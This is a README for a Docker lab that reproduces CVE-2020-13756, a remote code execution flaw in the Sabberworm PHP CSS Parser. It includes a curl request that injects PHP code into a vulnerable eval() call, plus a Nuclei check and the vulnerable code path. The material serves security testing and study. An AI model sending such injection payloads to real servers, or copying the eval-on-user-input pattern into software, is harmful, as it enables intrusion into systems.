# CVE-2020-13756 Vulnerable Environment

Vulnerable test environment for **CVE-2020-13756** - Sabberworm PHP CSS Parser Remote Code Execution.

## Vulnerability Details

| Field | Value |
|-------|-------|
| CVE | CVE-2020-13756 |
| Product | Sabberworm PHP CSS Parser |
| Vulnerable Versions | < 8.3.1 |
| Severity | Critical (CVSS 9.8) |
| Type | Remote Code Execution |

## Quick Start (One-Liner)

```bash
docker run -d -p 8080:80 $(docker build -q https://github.com/KrE80r/CVE-2020-13756-env.git)
```

Or clone and run:

```bash
git clone https://github.com/KrE80r/CVE-2020-13756-env.git && cd CVE-2020-13756-env && docker-compose up -d
```

## Manual Setup

```bash
# Clone repository
git clone https://github.com/KrE80r/CVE-2020-13756-env.git
cd CVE-2020-13756-env

# Build and run
docker build -t sabberworm-vuln .
docker run -d -p 8080:80 sabberworm-vuln
```

## Verify Vulnerability

```bash
# Test RCE - should print "VULN_TEST" in response
curl "http://localhost:8080/?n=100;printf(%22VULN_TEST%22);"
```

Expected output contains `VULN_TEST` at the beginning, proving code execution.

## Test with Nuclei

```bash
nuclei -t CVE-2020-13756.yaml -u http://localhost:8080 -debug
```

## Technical Details

The vulnerability exists in `getSelectorsBySpecificity()` function which passes unsanitized user input to `eval()`:

```php
// Vulnerable code path
$selectors = $doc->getSelectorsBySpecificity('> ' . $_GET['n']);
// When n=100;printf("test"); the eval() executes: eval('> 100;printf("test");')
```

## References

- [NVD](https://nvd.nist.gov/vuln/detail/CVE-2020-13756)
- [Fix Commit](https://github.com/MyIntervals/PHP-CSS-Parser/commit/2ebf59e8bfbf6cfc1653a5f0ed743b95062c62a4)
- [Full Disclosure](http://seclists.org/fulldisclosure/2020/Jun/7)
- [PacketStorm](http://packetstormsecurity.com/files/157923/Sabberworm-PHP-CSS-Code-Injection.html)

## Disclaimer

This environment is for **authorized security testing only**. Do not use against systems without permission.

## Author

KrE80r - Security Research
